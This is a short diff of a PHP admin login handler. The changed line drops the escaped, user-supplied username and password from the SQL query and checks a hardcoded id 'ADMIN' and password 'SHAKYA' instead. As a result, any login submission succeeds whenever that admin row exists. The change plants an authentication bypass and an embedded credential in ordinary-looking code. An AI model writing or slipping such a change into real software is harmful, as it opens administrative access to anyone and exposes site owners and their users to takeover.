@@ -317,7 +317,7 @@ if(isset($_POST['submit']))
   $username =mysqli_real_escape_string($link,$username);
   $password =mysqli_real_escape_string($link,$password);
 
-$result=mysqli_query($link,"select * from admin where id='$username' and password='$password'") or die("failed to query database".mysqli_error($link));
+$result=mysqli_query($link,"select * from admin where id='ADMIN' and password='SHAKYA'") or die("failed to query database".mysqli_error($link));
 	
 	if(mysqli_num_rows($result)>0)
 	{
